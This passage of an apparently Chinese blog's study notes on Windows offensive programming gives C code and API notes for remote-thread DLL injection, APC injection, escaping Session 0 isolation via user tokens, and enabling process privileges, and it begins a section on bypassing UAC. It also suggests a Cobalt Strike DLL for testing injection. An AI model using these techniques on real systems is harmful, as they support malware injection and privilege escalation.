class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line"></span><br><span class="line">DWORD status = ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDLLAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDLLAddr, 0, NULL);</span></span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">FreeLibrary(hNtdll);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这如果想通过MessageBox判断是否注入成功，会失败。由于会话隔离，在系统程序中不能显示程序窗体，也不能用常规方式来建立用户进程。可以使用cs的dll来判断注入是否成功。为了解决服务层和用户层交互的问题，微软设计了一系列以WTS(windows terminal service)开头的API来实现这些功能，下面几章会写。</p><h2 id="apc注入未完成">APC注入(未完成)</h2><p>APC(Asynchronous Procedure Calls)异步过程调用，<a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-callss">微软 APC</a></p><blockquote><p>每个线程都有自己的 APC 队列。应用程序通过调用QueueUserAPC函数将 APC 排队到线程中。调用线程在对QueueUserAPC的调用中指定 APC 函数的地址。APC的排队是线程调用APC函数的请求。</p><p>当用户模式 APC 排队时，它排队的线程不会被定向调用 APC 函数，除非它处于警报状态。线程在调用SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsEx、WaitForMultipleObjectsEx或WaitForSingleObjectEx函数时进入警报状态。如果在 APC 排队之前等待满足，则线程不再处于警报等待状态，因此不会执行 APC 函数。但是，APC 仍然在排队，因此当线程调用另一个可警报等待函数时，将执行 APC 函数。</p></blockquote><h3 id="api-3">API</h3><h4 id="queueuserapc">QueueUserAPC</h4><p>将用户模式<a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">异步过程调用</a>(APC) 对象添加到指定线程的 APC 队列。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">QueueUserAPC</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PAPCFUNC  pfnAPC,<span class="comment">//APC函数指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE    hThread,<span class="comment">//线程句柄，必须包含THREAD_SET_CONTEXT访问权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG_PTR dwData<span class="comment">//传递给APC函数的参数，单个值</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="createtoolhelp32snapshot">CreateToolhelp32Snapshot</h4><p>拍摄指定进程的快照，以及这些进程使用的堆、模块和线程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateToolhelp32Snapshot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD th32ProcessID<span class="comment">//进程标识符，0表示当前进程</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="process32first">Process32First</h4><p>第一个进程信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Process32First</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]      HANDLE           hSnapshot,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out] LPPROCESSENTRY32 lppe<span class="comment">//指向 PROCESSENTRY32结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="实现-3">实现</h3><p>一个进程有多个线程，为了确保能够执行插入的APC，需要向每个线程都插入APC。</p><p>具体流程：</p><ol type="1"><li></li></ol><h1 id="启动">启动</h1><p>三部分：</p><ol type="1"><li>创建进程API</li><li>突破SESSION0隔离创建进程</li><li>内存加载直接执行</li></ol><h2 id="创建进程api">创建进程API</h2><p>Windows常用3个创建进程的API</p><ul><li>WinExec</li><li>ShellExecute</li><li>CreateProcess</li></ul><h3 id="api-4">API</h3><h4 id="winexec">WinExec</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">WinExec</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCSTR lpCmdLine,<span class="comment">//文件名+参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] UINT   uCmdShow<span class="comment">//显示选项</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：</p><ul><li>成功：返回值大于31</li></ul><h4 id="shellexecutea">ShellExecuteA</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HINSTANCE <span class="title">ShellExecuteA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] HWND   hwnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpOperation,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           LPCSTR lpFile,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpParameters,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           INT    nShowCmd</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;s</span><br></pre></td></tr></table></figure><p>返回值：</p><ul><li>成功：返回值大于31</li></ul><h4 id="createprocessa">CreateProcessA</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpApplicationName,<span class="comment">//程序名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,<span class="comment">//指向 SECURITY_ATTRIBUTES结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="comment">//指向 SECURITY_ATTRIBUTES结构的指</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD                 dwCreationFlags,<span class="comment">//控制优先级和进程创建的标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID                lpEnvironment,<span class="comment">//指向新进程的环境块的指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpCurrentDirectory,<span class="comment">//当前进程完整目录</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="实现-4">实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecTest</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* pszFileName)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UINT a = WinExec(pszFileName, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellExecuteTest</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* pszFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HINSTANCE hInstance = ShellExecuteA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, pszFileName, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateProcessTest</span><span class="params">(<span class="keyword">char</span>* pszFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">STARTUPINFO si = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">si.wShowWindow = SW_SHOWNORMAL;</span><br><span class="line">BOOL res = CreateProcessA(<span class="literal">NULL</span>,pszFileName, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="keyword">if</span> (res == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;true\n&quot;</span>);</span><br><span class="line">CloseHandle(pi.hProcess);</span><br><span class="line">CloseHandle(pi.hThread);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;false&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="突破session-0隔离创建用户进程">突破SESSION 0隔离创建用户进程</h2><p>SESSION 0的内容见上文，为了解决服务层和用户层交互的问题，微软设计了一系列以WTS(windows terminal service)开头的API来实现这些功能。</p><h3 id="api-5">API</h3><h4 id="wtsgetactiveconsolesessionid">WTSGetActiveConsoleSessionId</h4><p>检索控制台会话的会话标识符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WTSGetActiveConsoleSessionId</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><h4 id="wtsqueryusertoken">WTSQueryUserToken</h4><p>获取会话 ID 指定的登录用户的主要访问令牌。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WTSQueryUserToken</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  ULONG   SessionId,<span class="comment">//远程桌面服务会话标识符。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PHANDLE phToken</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="duplicatetokenex">DuplicateTokenEx</h4><p>创建一个复制现有令牌的新<a href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/a-gly">访问令牌。</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DuplicateTokenEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           HANDLE                       hExistingToken,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                        dwDesiredAccess,<span class="comment">//指定新令牌的请求访问权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES        lpTokenAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           TOKEN_TYPE                   TokenType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE                      phNewToken</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="createenvironmentblock">CreateEnvironmentBlock</h4><p>检索指定用户的环境变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateEnvironmentBlock</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          LPVOID *lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] HANDLE hToken,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOL   bInherit</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="createprocessasusera">CreateProcessAsUserA</h4><p>创建一个新进程及其主线程。新进程在由指定令牌表示的用户的安全上下文中运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessAsUserA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      HANDLE                hToken,<span class="comment">//用户的主令牌的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD                 dwCreationFlags,<span class="comment">//控制优先级和进程创建的标志。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="实现-5">实现</h3><p>首先使用<code>WTSGetActiveConsoleSessionId</code>获取当前sessionID，之后调用<code>WTSQueryUserToken</code>返回用户令牌句柄，之后使用<code>DuplicateToken</code>创建新的令牌，并复制上面获取的用户令牌，之后使用<code>CreateEnvironmentBlock</code>创建一个环境块，再之后就是调用<code>CreateProcessAsUserA</code>创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">createUserProcess</span><span class="params">(<span class="keyword">char</span>* pszFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwSessionId;</span><br><span class="line">HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE hDuplicatedToken = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID lpEnvironment = <span class="literal">NULL</span>;</span><br><span class="line">STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line"><span class="comment">// 获得当前Session ID</span></span><br><span class="line">dwSessionId = WTSGetActiveConsoleSessionId();</span><br><span class="line"><span class="comment">// 获得当前Session的用户令牌</span></span><br><span class="line"><span class="keyword">if</span> (WTSQueryUserToken(dwSessionId, &amp;hToken) == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WTSGetActiveConsoleSessionId Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 复制令牌</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, <span class="literal">NULL</span>, SecurityIdentification, TokenPrimary, &amp;hDuplicatedToken))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;DuplicateTokenEx Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建用户Session环境</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == CreateEnvironmentBlock(&amp;lpEnvironment, hDuplicatedToken, FALSE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateEnvironmentBlock Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FALSE == CreateProcessAsUser(hDuplicatedToken, (LPCWSTR)pszFileName, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,</span><br><span class="line">lpEnvironment, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateProcessAsUser Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (lpEnvironment)</span><br><span class="line">DestroyEnvironmentBlock(lpEnvironment);</span><br><span class="line"><span class="keyword">if</span> (hDuplicatedToken)</span><br><span class="line">CloseHandle(hDuplicatedToken);</span><br><span class="line"><span class="keyword">if</span> (hToken)</span><br><span class="line">CloseHandle(hToken);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要实现突破SESSION 0隔离的话，必须将程序注册为一个系统服务进程 ，这样才在SESSION 0中，服务程序的入口点和普通的程序不同，需要调用<code>StartServiceCtrlDispatcher</code>函数来设置服务入口点函数，这里不写了，见<a href="https://github.com/jash-git/Windows-Hack-Programming-backup/blob/master/WINDOWS%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3-%E9%85%8D%E5%A5%97%E8%B5%84%E6%BA%90/%E7%94%A8%E6%88%B7%E5%B1%82/4/%E7%AA%81%E7%A0%B4SESSION%200%E9%9A%94%E7%A6%BB%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B/CreateProcessAsUser_Test/CreateProcessAsUser_Test/CreateProcessAsUser_Test.cpp">代码</a>。</p><h2 id="内存加载执行未完成">内存加载执行(未完成)</h2><p>就是把程序放到内存执行，不需要<code>LoadLibrary</code>，需要PE的知识。</p><p>代码见：<a href="https://github.com/jash-git/Windows-Hack-Programming-backup/blob/master/WINDOWS%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3-%E9%85%8D%E5%A5%97%E8%B5%84%E6%BA%90/%E7%94%A8%E6%88%B7%E5%B1%82/4/%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/RunDllInMem_Test/RunDllInMem_Test/MmLoadDll.cpp">代码</a></p><h1 id="提权技术bypass-uac部分未完成">提权技术(Bypass UAC部分未完成)</h1><p>主要是两种：</p><ol type="1"><li>进程访问令牌权限提升</li><li>Bypass UAC</li></ol><h2 id="进程访问令牌权限提升">进程访问令牌权限提升</h2><h3 id="api-6">API</h3><h4 id="openprocesstoken">OpenProcessToken</h4><p>打开与进程关联的<a href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/a-gly">访问令牌</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">OpenProcessToken</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE  ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD   DesiredAccess,<span class="comment">//指定一个访问掩码</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PHANDLE TokenHandle</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="lookupprivilegevalue">LookupPrivilegeValue</h4><p>查看系统权限的特权值，返回LUID结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">LookupPrivilegeValueA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpSystemName,<span class="comment">//指向以空字符结尾的字符串的指针，该字符串指定在其上检索特权名称的系统名称。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           LPCSTR lpName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PLUID  lpLuid</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="adjusttokenprivileges">AdjustTokenPrivileges</h4><p>启用或禁用指定<a href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/a-gly">访问令牌</a>中的权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">AdjustTokenPrivileges</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE            TokenHandle,<span class="comment">//要修改的权限的访问令牌的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            BOOL              DisableAllPrivileges,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PTOKEN_PRIVILEGES NewState,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            DWORD             BufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PTOKEN_PRIVILEGES PreviousState,<span class="comment">//一个指向缓冲区的指针，函数用TOKEN_PRIVILEGES结构填充该结构，该结构包含函数修改的任何特权的先前状态</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PDWORD            ReturnLength<span class="comment">//PreviousState大小，字节</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="实现-6">实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">enablePrivileges</span><span class="params">(HANDLE hProcess, <span class="keyword">char</span>* pszPrivilegesName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">BOOL res = FALSE;</span><br><span class="line">LUID luidValue = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">TOKEN_PRIVILEGES tokenPrivileges = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);</span><br><span class="line">LookupPrivilegeValue(<span class="literal">NULL</span>,(LPCWSTR)pszPrivilegesName, &amp;luidValue);</span><br><span class="line">tokenPrivileges.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tokenPrivileges.Privileges[<span class="number">0</span>].Luid = luidValue;</span><br><span class="line">tokenPrivileges.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">res=AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivileges, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, res);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">if</span> (GetLastError() == ERROR_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AdjustTokenPrivileges</code>的返回值为true也不代表特权设置成功，必须要<code>GetLastError</code>的值为<code>ERROR_SUCCESS</code>才成功，如果再程序中只提升一个访问令牌特权，且错误码为<code>ERROR_NOT_ALL_ASSIGNED</code>,则提升失败。如果程序运行再Windows 7或者以上版本的操作系统，可以尝试以管理员身份运行程序，然后再进行测试。</p><figure><img src="/2022/10/10/2022-9-WinCode1/image-20221011224037542.png" alt="image-20221011224037542"><figcaption aria-hidden="true">image-20221011224037542</figcaption></figure><h2 id="bypassuac">BypassUAC</h2><blockquote><p>UAC需要授权的动作包括：</p><ul><li>以管理员身份运行程序</li><li>配置<a href="https://zh.wikipedia.org/wiki/Windows_Update">Windows Update</a></li><li>增加或删除用户账户</li><li>改变用户的账户类型</li><li>配置来宾（Guest）账户（Windows 7和8.1）</li><li>改变UAC设置</li><li>安装<a href="https://zh.wikipedia.org/wiki/ActiveX">ActiveX</a></li><li>安装或移除<a href="https://zh.wikipedia.org/wiki/计算机程序">程序</a></li><li>安装设备<a href="https://zh.wikipedia.org/wiki/驅動程式">驱动程序</a></li><li>设置家长控制</li><li>修改系统盘根目录、<strong>Program 